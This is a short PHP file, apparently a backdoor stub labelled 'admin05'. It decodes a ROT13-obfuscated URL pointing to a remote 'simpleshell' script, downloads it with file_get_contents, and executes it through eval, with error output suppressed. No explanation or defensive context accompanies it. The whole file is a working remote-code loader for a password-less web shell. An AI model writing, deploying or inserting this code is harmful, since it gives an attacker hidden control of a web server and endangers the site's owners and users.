<?php
#admin05
@eval("?>" . @file_get_contents(str_rot13("uggcf://enj.cbfgvatrpbagnpg.pbzrgzrf/AbboGrpub/fvzcyrfuryy/ersf/urnqf/znva/fvzcyrf-ab-cj.cuc")));
?>
